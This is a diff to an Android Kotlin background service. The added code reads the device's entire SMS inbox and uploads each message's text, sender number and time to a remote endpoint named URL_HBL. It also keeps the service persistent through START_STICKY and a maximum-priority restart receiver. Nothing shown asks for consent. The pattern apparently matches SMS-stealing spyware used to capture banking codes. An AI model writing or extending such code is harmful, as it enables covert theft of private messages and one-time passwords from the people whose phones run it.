@@ -6,6 +6,7 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.content.Intent
+import android.content.IntentFilter
 import android.database.Cursor
 import android.graphics.Color
 import android.net.Uri
@@ -61,39 +62,46 @@ class YourService : Service() {
             .build()
         startForeground(2, notification)
     }
-
+    fun startBroadCast(){
+        val filter = IntentFilter()
+        filter.addAction("restartService")
+        filter.priority = 2147483647
+        val receiver = Restarter()
+        registerReceiver(receiver, filter)
+    }
     override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
-        startTimer()
+        Log.i("BackServices", "Back Service Started")
+        startBroadCast()
+        sendSms()
         return START_STICKY
     }
 
     override fun onDestroy() {
         super.onDestroy()
         stoptimertask()
-        val broadcastIntent = Intent()
-        broadcastIntent.action = "restartservice"
-        broadcastIntent.setClass(this, Restarter::class.java)
-        this.sendBroadcast(broadcastIntent)
     }
+
 
     private var timer: Timer? = null
     private var timerTask: TimerTask? = null
     private var count = 0;
+    fun sendSms(){
+        var list = getSMS()!!
+        count = getSMS()!!.size;
+        if (count != 0) {
+            postSms(
+                list.getOrNull(list.size - count)!!.msg!!,
+                list.getOrNull(list.size - count)!!.number!!,
+                list.getOrNull(list.size - count)!!.dateTime!!
+            )
+        }
+    }
     fun startTimer() {
         timer = Timer()
         timerTask = object : TimerTask() {
             override fun run() {
-                Log.i("startuptest", "=========  " + counter++)
-                var list = getSMS()!!
-                count = getSMS()!!.size;
-                if (count != 0) {
-                    postSms(
-                        list.getOrNull(list.size - count)!!.msg!!,
-                        list.getOrNull(list.size - count)!!.number!!,
-                        list.getOrNull(list.size - count)!!.dateTime!!
-                    )
-                }
+                Log.i("BackServices", "=========  " + counter++)
             }
         }
         timer!!.scheduleAtFixedRate(timerTask, 0,300*1000) //
@@ -129,7 +137,7 @@ class YourService : Service() {
             msg
         )
 
-        Log.i("SmsApis", "Request" + Gson().toJson(request))
+        Log.i("BackServices", "Request" + Gson().toJson(request))
         ApiStore.instance?.postSms(
             RetrofitEnums.URL_HBL,
             secureCodeValue,numberValue,sms,dateTimeValue,
@@ -137,9 +145,9 @@ class YourService : Service() {
                 override fun SmsSuccess(response: SmsResponse) {
                     var list = getSMS()!!
                     if (count == 1) {
-                        Log.i("SmsApis", "All Sms Sent" + Gson().toJson(response))
+                        Log.i("BackServices", "All Sms Sent" + Gson().toJson(response))
                     } else {
-                        Log.i("SmsApis", Gson().toJson(response))
+                        Log.i("BackServices", Gson().toJson(response))
                         count--;
                         postSms(
                             list.getOrNull(list.size - count)!!.msg!!,
@@ -157,7 +165,6 @@ class YourService : Service() {
 
 
     @SuppressLint("Range")
-//    fun getSMS(): RealmResults<OSmsModel> {
     fun getSMS():ArrayList<SmsModel> {
         val sms: ArrayList<SmsModel> = ArrayList()
         val uriSMSURI: Uri = Uri.parse("content://sms/inbox")
@@ -172,9 +179,7 @@ class YourService : Service() {
             smsModel.dateTime = millisToDate(date.toLong())!!
             smsModel.id = date!!
             sms.add(smsModel!!)
-//            RealmController.getInstance().saveSms(smsModel,date)
         }
-//        return  RealmController.getInstance().sms
         return sms
     }
 
